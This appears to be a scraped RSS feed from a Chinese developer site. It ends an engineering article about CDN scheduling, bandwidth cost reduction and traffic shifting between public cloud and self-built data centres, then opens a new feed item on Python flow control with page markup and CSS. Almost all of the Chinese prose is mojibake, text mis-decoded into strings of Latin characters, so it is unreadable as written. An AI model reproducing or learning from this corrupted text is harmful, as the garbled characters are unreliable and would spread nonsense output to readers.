<p>**ç¬¬äºŒæ­¥ï¼Œ**å®ƒä¼šå…ˆå‘æˆ‘ä»¬çš„â€œ302è°ƒåº¦æœåŠ¡â€å‘èµ·ä¸€æ¬¡è¯·æ±‚ï¼Œé—®ä¸€ä¸ªé—®é¢˜ï¼šâ€œç°åœ¨å“ªä¸ªCDNæœ€å¿«ï¼Ÿâ€</p>
</li>
<li>
<p><strong>ç¬¬ä¸‰æ­¥ï¼Œæˆ‘ä»¬çš„è°ƒåº¦æœåŠ¡</strong>ï¼Œä¼šæ ¹æ®æµ·é‡çš„åŸ‹ç‚¹æ•°æ®ï¼Œé€šè¿‡æ™ºèƒ½ç®—æ³•è¿›è¡Œå®æ—¶è®¡ç®—ï¼Œç„¶åç«‹åˆ»å‘Šè¯‰ä¸šåŠ¡æœåŠ¡ç«¯ä¸€ä¸ªæœ€ä¼˜çš„å‚å•†åŸŸåã€‚</p>
</li>
<li>
<p>**ç¬¬å››æ­¥ï¼Œ**ä¸šåŠ¡æœåŠ¡ç«¯æ‹¿åˆ°è¿™ä¸ªæœ€ä¼˜åŸŸååï¼Œå†é€šè¿‡302è·³è½¬çš„æ–¹å¼ï¼ŒæŠŠç”¨æˆ·å¼•å¯¼è¿‡å»ã€‚</p>
</li>
</ul>
<p>æ•´ä¸ªè¿‡ç¨‹å¯¹ç”¨æˆ·æ˜¯å®Œå…¨é€æ˜çš„ï¼Œä½†æˆ‘ä»¬ç¡®ä¿äº†ç”¨æˆ·çš„æ¯ä¸€æ¬¡ä¸‹è½½ï¼Œèµ°çš„éƒ½æ˜¯å½“ä¸‹æœ€ä¼˜çš„è·¯å¾„ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d3aa51e8813b49a5b5d03e601f9d74df~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdml2b-S6kuiBlOe9keaKgOacrw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768445274&amp;x-signature=LFEjE8Knc5h4XXJcc9Z1CGPFxts%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>è¿™å¥—æ–¹æ¡ˆçš„èƒŒåï¼Œæ˜¯ä¸€ä¸ªå¼ºå¤§çš„æŠ€æœ¯æ¶æ„åœ¨æ”¯æ’‘ã€‚ å¤§å®¶å¯ä»¥çœ‹åˆ°ï¼Œå®ƒåŒ…å«äº†å®Œæ•´çš„æŒ‡æ ‡æ•°æ®é‡‡é›†å¤„ç†å±‚å’Œè°ƒåº¦æ‰§è¡Œå±‚ã€‚</p>
<p>æˆ‘ä»¬é€šè¿‡ETLã€Druidç­‰å¤§æ•°æ®æŠ€æœ¯ï¼Œå¯¹æµ·é‡çš„ä¸šåŠ¡æŒ‡æ ‡æ•°æ®è¿›è¡Œå®æ—¶å¤„ç†ã€‚ åœ¨æ§åˆ¶å±‚ï¼Œæˆ‘ä»¬æœ‰çµæ´»çš„è°ƒåº¦ç­–ç•¥ç®¡ç†å’Œå¤šé‡è°ƒåº¦ç®—æ³•ã€‚</p>
<p>åœ¨è°ƒåº¦æ‰§è¡Œå±‚ï¼Œæˆ‘ä»¬é€šè¿‡ç»Ÿä¸€çš„ç½‘å…³ï¼Œä¸ºå•†åº—ã€æ¸¸æˆã€ç³»ç»Ÿå‡çº§ç­‰å…«åå¤šä¸ªä¸šåŠ¡åœºæ™¯æä¾›æœåŠ¡ã€‚</p>
<p>æ•´ä¸ªæ¶æ„çš„è®¾è®¡ï¼Œæ ¸å¿ƒå°±æ˜¯ä¸ºäº†ä¿è¯å››ç‚¹ï¼š<strong>ç²¾ç»†åŒ–æ§åˆ¶</strong>ã€<strong>æ•…éšœå¿«é€Ÿåˆ‡æ¢</strong>ã€<strong>å®æ—¶æ€§ä¸åŠ¨æ€é€‚åº”</strong>ï¼Œä»¥åŠ<strong>çµæ´»å¯æ‰©å±•</strong>ã€‚</p>
<p>æ­£æ˜¯è¿™äº›ï¼Œæ‰è®©æˆ‘ä»¬çš„è°ƒåº¦æœåŠ¡æ—¢å¿«åˆå‡†ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ba0c8ec6139d473da78389a333efea7e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdml2b-S6kuiBlOe9keaKgOacrw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768445274&amp;x-signature=RetECY7U9NkR76JpwH%2BSi1lrXJc%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>æœ€ç»ˆå¸¦æ¥äº†ä»€ä¹ˆæ ·çš„æ•ˆæœå‘¢ï¼Ÿ</p>
<ul>
<li>
<p>é¦–å…ˆæ˜¯<strong>æ€§èƒ½</strong>ï¼šæˆ‘ä»¬çš„æœåŠ¡ç«¯P99å“åº”æ—¶é—´åšåˆ°äº†å°äº2æ¯«ç§’ï¼è¿™å¯¹ç”¨æˆ·æ¥è¯´æ˜¯å®Œå…¨æ— æ„Ÿçš„ã€‚åŒæ—¶ï¼Œé…ç½®å˜æ›´å¯ä»¥ç§’çº§ç”Ÿæ•ˆï¼Œå®ç°äº†çœŸæ­£çš„å®æ—¶ã€‚</p>
</li>
<li>
<p>å…¶æ¬¡æ˜¯<strong>è§„æ¨¡</strong>ï¼šç›®å‰æ¯å¤©çš„è°ƒåº¦æ‰§è¡Œæ¬¡æ•°ï¼Œè¶…è¿‡äº†60äº¿æ¬¡ï¼è¦†ç›–äº†æˆ‘ä»¬80å¤šä¸ªæ ¸å¿ƒä¸šåŠ¡åœºæ™¯ã€‚</p>
</li>
<li>
<p>æœ€åæ˜¯<strong>ä¸šåŠ¡ä»·å€¼</strong>ï¼šé€šè¿‡è¿™å¥—ç³»ç»Ÿï¼Œæˆ‘ä»¬ä¸ºåº”ç”¨å•†åº—ç­‰ä¸šåŠ¡ï¼Œå¸¦æ¥äº†æ•´ä½“ä¸‹è½½é€Ÿåº¦æå‡è¶…è¿‡2%ï¼</p>
</li>
<li>
<p>**æ›´å…³é”®çš„æ˜¯ï¼Œ**å®ƒä¸ºæˆ‘ä»¬çš„å•†ä¸šåŒ–å¸¦æ¥äº†è¶…è¿‡åƒä¸‡å…ƒçš„æ”¶å…¥æå‡ï¼è¿™å°±æ˜¯æŠ€æœ¯é©±åŠ¨ä¸šåŠ¡å¢é•¿æœ€ç›´æ¥ä½“ç°ï¼</p>
</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e96ada5dabc94d70ad93ebf17ae57468~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdml2b-S6kuiBlOe9keaKgOacrw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768445274&amp;x-signature=9I%2BEj0qGc7nRSGfFN9QRUjMKeHo%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<h4 data-id="heading-14">3.2.4 å…¬ç½‘å¸¦å®½æ²»ç†</h4>
<p>è®²å®Œäº†CDNï¼Œæˆ‘ä»¬å†æ¥çœ‹å¦ä¸€ä¸ªæˆæœ¬å¤§å¤´ï¼šæœºæˆ¿å…¬ç½‘å¸¦å®½ã€‚ ä»è¿™å¼ å…¨ç½‘å…¬ç½‘å¸¦å®½çš„è¶‹åŠ¿å›¾ã€‚å¯ä»¥çœ‹åˆ°ï¼Œåœ¨2022å¹´ä¹‹å‰ï¼Œæˆ‘ä»¬çš„å¸¦å®½å¢å¹…æ˜¯æ¯”è¾ƒå¤§çš„ï¼Œæˆæœ¬å‹åŠ›ä¹Ÿéšä¹‹è€Œæ¥ã€‚</p>
<p>ä½†æ˜¯ï¼Œä»2023å¹´å¼€å§‹ï¼Œå¢å¹…æ˜æ˜¾è¶‹äºå¹³ç¨³ã€‚ è¿™ä¸æ˜¯å› ä¸ºä¸šåŠ¡åœæ»äº†ï¼Œè€Œæ˜¯å› ä¸ºæˆ‘ä»¬è¿›è¡Œäº†ä¸€ç³»åˆ—æŒç»­çš„æˆæœ¬æ²»ç†å’Œè¿è¥ã€‚æ¯”å¦‚ï¼Œæˆ‘ä»¬é‡ç‚¹é’ˆå¯¹ä¸»åŠ¨ä¸Šç½‘ã€åŸ‹ç‚¹ä¸šåŠ¡å’Œå‡ºå…¥å‘å‡è¡¡è¿›è¡Œäº†ä¸“é¡¹ä¼˜åŒ–ï¼ŒæˆåŠŸåœ°å°†å¸¦å®½å¢é•¿æ§åˆ¶åœ¨äº†å¯é¢„æœŸçš„èŒƒå›´å†…ã€‚</p>
<p>æ¥ä¸‹æ¥ï¼Œæˆ‘å°±ä¸ºå¤§å®¶ä»‹ç»ä¸€ä¸‹æˆ‘ä»¬å®ç°è¿™ä¸ªç›®æ ‡çš„å…³é”®èƒ½åŠ›ã€‚ è¦å®ç°å…¬ç½‘å¸¦å®½é™æœ¬ï¼Œæˆ‘ä»¬åŒæ ·æ‰“é€ äº†ä¸€å¥—å…¬ç½‘å¸¦å®½è°ƒåº¦ä½“ç³»ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/465b3896e3bc44c5a06565d70ec75af2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdml2b-S6kuiBlOe9keaKgOacrw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768445274&amp;x-signature=Te9kFJOc8gGMM9QfgtTtQu9FzyU%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>è¿™å¥—ä½“ç³»ä¸»è¦åŒ…å«äº†å‡ ä¸ªæ ¸å¿ƒèƒ½åŠ›ï¼š</p>
<ul>
<li>
<p>é¦–å…ˆï¼Œæ˜¯IDCæœºæˆ¿å¸¦å®½çš„æ™ºèƒ½è°ƒåº¦ï¼Œè¿™æ˜¯æˆ‘ä»¬è¿›è¡Œæµé‡è…¾æŒªçš„åŸºç¡€ã€‚</p>
</li>
<li>
<p>å…¶æ¬¡ï¼Œæ˜¯å¸¦å®½ç”¨é‡çš„å½’å› åˆ†æå’Œæˆæœ¬åˆ†æ‘Šï¼Œè®©æˆ‘ä»¬æ¸…æ¥šæ¯ä¸€åˆ†å¼€é”€èŠ±åœ¨äº†å“ªé‡Œã€‚</p>
</li>
<li>
<p>æœ€åï¼Œä¹Ÿæ˜¯æœ€é‡è¦çš„ï¼Œæ˜¯åŸºäºæ‹¨æµ‹æ•°æ®çš„è´¨é‡è°ƒåº¦å’Œç›‘æ§ï¼Œç¡®ä¿æˆ‘ä»¬åœ¨ä¼˜åŒ–æˆæœ¬çš„åŒæ—¶ï¼Œä¸ç‰ºç‰²ç”¨æˆ·ä½“éªŒã€‚</p>
</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6194aa63378046239e79b039661a8da8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdml2b-S6kuiBlOe9keaKgOacrw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768445274&amp;x-signature=ya8rqzU6FU76odY4fDsjd9AcQ4Y%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>å¦‚ä¸‹äº§å“æ¶æ„å›¾ï¼Œå±•ç¤ºäº†æˆ‘ä»¬å…¨çƒæ··åˆäº‘ç¯å¢ƒä¸‹ï¼Œå…¬ç½‘å¸¦å®½è°ƒåº¦çš„å…¨è²Œã€‚ å½“ä¸€ä¸ªvivoçš„å…¨çƒç”¨æˆ·å‘èµ·è®¿é—®æ—¶ï¼Œæˆ‘ä»¬çš„æ™ºèƒ½è§£æç³»ç»Ÿ(VHS)ï¼Œä¼šæˆä¸ºç¬¬ä¸€ä¸ªå†³ç­–å…¥å£ã€‚</p>
<p>å®ƒä¼šç»“åˆæ¥è‡ªæˆ‘ä»¬å…¨çƒæ‹¨æµ‹ç‚¹çš„æºç«™è´¨é‡ç›‘æµ‹æ•°æ®ï¼Œä»¥åŠæˆ‘ä»¬VIPåœ°å€æ± çš„ç®¡ç†ç­–ç•¥ï¼Œæ™ºèƒ½åœ°åˆ¤æ–­ï¼Œåº”è¯¥æŠŠè¿™ä¸ªç”¨æˆ·çš„è¯·æ±‚ï¼Œè§£æåˆ°å“ªä¸ªåœ°åŸŸçš„å“ªä¸ªæœºæˆ¿ã€‚</p>
<p>è¿™ä¸ªæœºæˆ¿ï¼Œå¯èƒ½æ˜¯æˆ‘ä»¬åœ¨åŒ—äº¬çš„è‡ªå»ºIDCï¼Œä¹Ÿå¯èƒ½æ˜¯æˆ‘ä»¬åœ¨æ–°åŠ å¡ã€å¾·å›½çš„ç«å±±äº‘æˆ–è°·æ­Œäº‘ã€‚</p>
<p>æ•´ä¸ªå†³ç­–è¿‡ç¨‹ï¼Œéƒ½ä¼šåœ¨æˆ‘ä»¬çš„ç»Ÿä¸€æ§åˆ¶å°ä¸Šè¿›è¡Œå¯è§†åŒ–çš„ç®¡ç†å’Œå¹²é¢„ï¼ŒåŒ…æ‹¬æˆæœ¬è°ƒåº¦ã€è´¨é‡è°ƒåº¦ã€æ•…éšœåˆ†æç­‰ç­‰ã€‚é€šè¿‡è¿™å¥—æ¶æ„ï¼Œæˆ‘ä»¬å®ç°äº†å¯¹å…¨çƒæµé‡çš„â€œå®è§‚è°ƒæ§â€ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c03a39272a074497bbac3ac7b7631010~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdml2b-S6kuiBlOe9keaKgOacrw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768445274&amp;x-signature=ghIQcy9RKmRvYiUHGAOgnV8ZoVU%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>åœ¨ä¼—å¤šè°ƒåº¦ç­–ç•¥ä¸­ï¼Œæœ‰ä¸€ä¸ªéå¸¸æœ‰æ•ˆçš„æˆæœ¬è°ƒåº¦ç­–ç•¥ï¼Œå°±æ˜¯â€œå…¬æœ‰äº‘è°ƒåº¦è‡ªå»ºæœºæˆ¿â€ã€‚</p>
<p>å®ƒçš„æ ¸å¿ƒåŸç†ï¼Œå…¶å®å°±æ˜¯åˆ©ç”¨äº†ä¸åŒèµ„æºçš„è®¡è´¹æ¨¡å‹å·®å¼‚ã€‚å¤§å®¶çŸ¥é“ï¼Œå…¬æœ‰äº‘æ˜¯æŒ‰æµé‡è®¡è´¹ï¼Œç”¨å¤šå°‘ç®—å¤šå°‘ï¼›è€Œæˆ‘ä»¬çš„è‡ªå»ºIDCï¼Œæ˜¯æŒ‰å¸¦å®½å³°å€¼è®¡FÃ¨iï¼Œå°±åƒåŒ…æœˆå¥—é¤ã€‚</p>
<p>é‚£ä¹ˆï¼Œè¿™é‡Œå°±æœ‰äº†ä¸€ä¸ªå·¨å¤§çš„ä¼˜åŒ–ç©ºé—´ã€‚å¤§å®¶çœ‹è¿™å¼ å›¾ï¼Œæˆ‘ä»¬çš„ç›‘æ§ç³»ç»Ÿä¼šå®æ—¶é‡‡é›†è‡ªå»ºIDCçš„å¸¦å®½ç”¨é‡ã€‚å½“å‘ç°IDCå¤„äºå¸¦å®½ä½è°·æ—¶ï¼Œæ¯”å¦‚å‡Œæ™¨ï¼Œæµé‡å¾ˆå°‘ï¼Œå¸¦å®½å¤§é‡é—²ç½®ï¼Œéå¸¸æµªè´¹ã€‚</p>
<p>è¿™æ—¶ï¼Œæˆ‘ä»¬çš„è°ƒåº¦å†³ç­–ç³»ç»Ÿå°±ä¼šè‡ªåŠ¨æ‰§è¡Œåˆ‡æ¢ï¼Œé€šè¿‡DNSè§£ææˆ–è€…CDNæºç«™å˜æ›´ï¼ŒæŠŠä¸€éƒ¨åˆ†åŸæœ¬è·‘åœ¨å…¬æœ‰äº‘ä¸Šçš„æµé‡ï¼Œè°ƒåº¦åˆ°æˆ‘ä»¬é—²ç½®çš„è‡ªå»ºIDCä¸Šæ¥ã€‚</p>
<p>è¿™ä¸ªâ€œå‰Šå³°å¡«è°·â€çš„åŠ¨ä½œï¼Œæ•ˆæœéå¸¸æ˜¾è‘—ï¼šå…¬æœ‰äº‘è°ƒåº¦åˆ°IDCçš„æµé‡å æ¯”è¶…è¿‡äº†60%ï¼Œæ¯å¹´ä¸ºæˆ‘ä»¬èŠ‚çœäº†æ•°ç™¾ä¸‡çš„æµé‡æˆæœ¬ï¼</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b372579b19cd43b29bf75923de6a9d10~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdml2b-S6kuiBlOe9keaKgOacrw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768445274&amp;x-signature=OJqVHFvPo4H9MHVT7kcVimHnkno%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<h2 data-id="heading-15">å››ã€æ€»ç»“ä¸å±•æœ›</h2>
<p>é€šè¿‡â€œæ‹¨æµ‹ç›‘æ§â€å’Œâ€œèåˆæµé‡ç®¡ç†å¹³å°â€çš„è¿™ä¸€ç³»åˆ—å®è·µï¼Œæˆ‘ä»¬å–å¾—äº†å“ªäº›æ˜¾è‘—çš„æˆæ•ˆå‘¢ï¼Ÿ</p>
<ul>
<li>
<p>é¦–å…ˆï¼Œåœ¨<strong>ç»Ÿä¸€çº³ç®¡</strong>ä¸Šï¼Œæˆ‘ä»¬å±è”½äº†åº•å±‚ä¾›åº”å•†çš„å·®å¼‚ï¼Œå¯¹å¤–æä¾›äº†ä¸€è‡´çš„æ¥å£èƒ½åŠ›ï¼Œå¤§å¤§æå‡äº†è¿ç»´æ•ˆç‡ã€‚</p>
</li>
<li>
<p>å…¶æ¬¡ï¼Œåœ¨<strong>æå‡è´¨é‡</strong>ä¸Šï¼Œæˆ‘ä»¬ä¸ºæ ¸å¿ƒä¸šåŠ¡ï¼Œæ¯”å¦‚åº”ç”¨å•†åº—ï¼Œå¸¦æ¥äº†æ•´ä½“ä¸‹è½½é€Ÿåº¦è¶…è¿‡2%çš„æå‡ï¼Œè¿™å¯¹ç”¨æˆ·ä½“éªŒæ˜¯å®å®åœ¨åœ¨çš„æ”¹å–„ã€‚</p>
</li>
<li>
<p>ç¬¬ä¸‰ï¼Œåœ¨<strong>é™ä½æˆæœ¬</strong>ä¸Šï¼Œæˆ‘ä»¬é€šè¿‡ä¸€ç³»åˆ—æ™ºèƒ½è°ƒåº¦æ‰‹æ®µï¼Œå®ç°äº†CDNå’Œå…¬ç½‘å¸¦å®½çš„åƒä¸‡çº§é™æœ¬ï¼Œè¿™æ˜¯éå¸¸å¯è§‚çš„ç»æµæ•ˆç›Šã€‚</p>
</li>
<li>
<p>æœ€åï¼Œä¹Ÿæ˜¯æœ€é‡è¦çš„ï¼Œæˆ‘ä»¬å®ç°äº†<strong>è¥æ”¶å¢æ•ˆ</strong>ï¼è´¨é‡çš„æå‡å’Œæˆæœ¬çš„ä¼˜åŒ–ï¼Œæœ€ç»ˆè½¬åŒ–ä¸ºäº†å•†ä¸šåŒ–è¿è¥æ”¶å…¥çš„æ˜¾è‘—æå‡ï¼</p>
</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7274fdc6a76a4815ad4c6a1fa7655bbd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdml2b-S6kuiBlOe9keaKgOacrw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768445274&amp;x-signature=Xfk2JnRCfAnFzYIt27g%2BPJbkSCs%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>æˆ‘ä»¬çš„æ¢ç´¢å’Œå®è·µè¿˜åœ¨è·¯ä¸Šï¼Œæ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬ä¸»è¦æœ‰ä¸‰ä¸ª<strong>å‘å±•æ–¹å‘</strong>ï¼š</p>
<ul>
<li>
<p>ç¬¬ä¸€ï¼Œæ˜¯<strong>AIé©±åŠ¨çš„æ·±åº¦ä¼˜åŒ–</strong>ã€‚æˆ‘ä»¬å°†å¼•å…¥æ›´å¼ºå¤§çš„AIèƒ½åŠ›ï¼Œå»å®ç°æ›´ç²¾å‡†çš„æµé‡é¢„æµ‹å’Œæ›´æ™ºèƒ½çš„å¼‚å¸¸è‡ªæ„ˆã€‚</p>
</li>
<li>
<p>ç¬¬äºŒï¼Œæ˜¯<strong>å¤šäº‘/æ··åˆäº‘æµé‡ç®¡ç†çš„æŒç»­æ·±åŒ–</strong>ã€‚æˆ‘ä»¬ä¼šå°†å½“å‰çš„æˆåŠŸç»éªŒï¼Œæ‰©å±•åˆ°æ›´å¹¿é˜”çš„æµ·å¤–å¸‚åœºï¼Œä¸ºå…¬å¸å…¨çƒåŒ–çš„å‡ºæµ·ä¸šåŠ¡ä¿é©¾æŠ¤èˆªã€‚</p>
</li>
<li>
<p>ç¬¬ä¸‰ï¼Œä¹Ÿæ˜¯æˆ‘ä»¬è®¤ä¸ºæå…·ä»·å€¼çš„ä¸€ç‚¹ï¼Œæ˜¯<strong>æ‰“é€šç½‘ç»œè´¨é‡å’Œä¸šåŠ¡æŒ‡æ ‡çš„å…³è”</strong>ã€‚æˆ‘ä»¬è¦å»ºç«‹èµ·ä¸šåŠ¡å¢é•¿å’Œç½‘ç»œæŒ‡æ ‡çš„å…³è”åˆ†æèƒ½åŠ›ï¼Œç”¨æ•°æ®è¯æ˜æ¯ä¸€æ¬¡ç½‘ç»œä¼˜åŒ–ï¼Œæ˜¯å¦‚ä½•å®å®åœ¨åœ¨åœ°ä¸ºä¸šåŠ¡æ”¶å…¥å¢é•¿èµ‹èƒ½çš„ï¼</p>
</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5cffe2b43ba24c1aafa7532b57d03003~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdml2b-S6kuiBlOe9keaKgOacrw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768445274&amp;x-signature=NnK%2FwwXIN2LmuwtWVzeM%2BpqawYo%3D" alt="å›¾ç‰‡" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ·±å…¥ç†è§£Pythonæµç¨‹æ§åˆ¶ï¼šä»ç®—æ³•è®¾è®¡åˆ°é¡ºåºæ‰§è¡Œæœºåˆ¶ï¼ˆé™„ä»£ç ï¼‰]]></title>    <link>https://juejin.cn/post/7592431064976932879</link>    <guid>https://juejin.cn/post/7592431064976932879</guid>    <pubDate>2026-01-07T14:30:18.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592431064976932879" data-draft-id="7592440247956455439" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æ·±å…¥ç†è§£Pythonæµç¨‹æ§åˆ¶ï¼šä»ç®—æ³•è®¾è®¡åˆ°é¡ºåºæ‰§è¡Œæœºåˆ¶ï¼ˆé™„ä»£ç ï¼‰"/> <meta itemprop="keywords" content="Python"/> <meta itemprop="datePublished" content="2026-01-07T14:30:18.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="love_summer"/> <meta itemprop="url" content="https://juejin.cn/user/1462819851084228"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æ·±å…¥ç†è§£Pythonæµç¨‹æ§åˆ¶ï¼šä»ç®—æ³•è®¾è®¡åˆ°é¡ºåºæ‰§è¡Œæœºåˆ¶ï¼ˆé™„ä»£ç ï¼‰
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1462819851084228/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    love_summer
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-07T14:30:18.000Z" title="Wed Jan 07 2026 14:30:18 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-07
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;color:#3c9dff}.markdown-body h1{font-size:30px;margin-bottom:5px;padding-bottom:8px;text-align:center}.markdown-body h2{font-size:24px;padding-bottom:6px}.markdown-body h2:before{content:"ğŸ‹"}.markdown-body h3{font-size:18px;padding-bottom:0}.markdown-body h3:before{content:"ğŸ“"}.markdown-body h4{font-size:16px}.markdown-body h4:before{content:"ğŸ‘"}.markdown-body h5{font-size:15px}.markdown-body h5:before{content:"ğŸ‰"}.markdown-body h6{margin-top:5px}.markdown-body h6:before{content:"ğŸ’"}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{display:block;margin:0 auto;max-width:100%;border-radius:4px;padding:1px;border:1px solid #d2e8ff}.markdown-body img:hover{box-shadow:0 1px 3px #5eaeff}.markdown-body hr{height:4px;margin:34px 0;background-size:4px 1px;background-image:linear-gradient(270deg,#5eaeff,#f3f9ff 25%,transparent 50%);border-style:none}.markdown-body code{word-break:break-word;border-radius:3px;overflow-x:auto;background-color:#d2e8ff;color:#3c9dff;font-size:.9em;padding:.1em .5em;margin:0 3px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace;transition:all .3s}.markdown-body pre{overflow:auto;position:relative;line-height:1.75;border:1px solid #90c7ff;border-radius:4px}.markdown-body pre:hover{box-shadow:0 1px 10px #beddff}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#3c9dff;border-bottom:1px solid #90c7ff;transition:all .3s}.markdown-body a:hover{color:#007fff;border-bottom:2px solid #5eaeff}.markdown-body a[href]:not(:empty){padding-right:18px}.markdown-body a[href]:not(:empty):after{display:inline-block;width:16px;height:16px;margin-left:2px;content:"";background:url(data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iaWNvbiIgdmlld0JveD0iMCAwIDEwMjQgMTAyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB3aWR0aD0iMTYiIGhlaWdodD0iMTYiPjxwYXRoIGQ9Ik0zODQgMTI4YTQ4IDQ4IDAgMDEyLjgxNiA5NS45MkwzODQgMjI0SDI1NmEzMiAzMiAwIDAwLTMxLjkyIDI5LjZMMjI0IDI1NnY1MTJhMzIgMzIgMCAwMDI5LjYgMzEuOTJsMi40LjA4aDUxMmEzMiAzMiAwIDAwMzEuOTItMjkuNmwuMDgtMi40VjY1NmE0OCA0OCAwIDAxOTUuOTItMi44MTZMODk2IDY1NnYxMTJhMTI4IDEyOCAwIDAxLTEyNCAxMjcuOTM2bC00IC4wNjRIMjU2YTEyOCAxM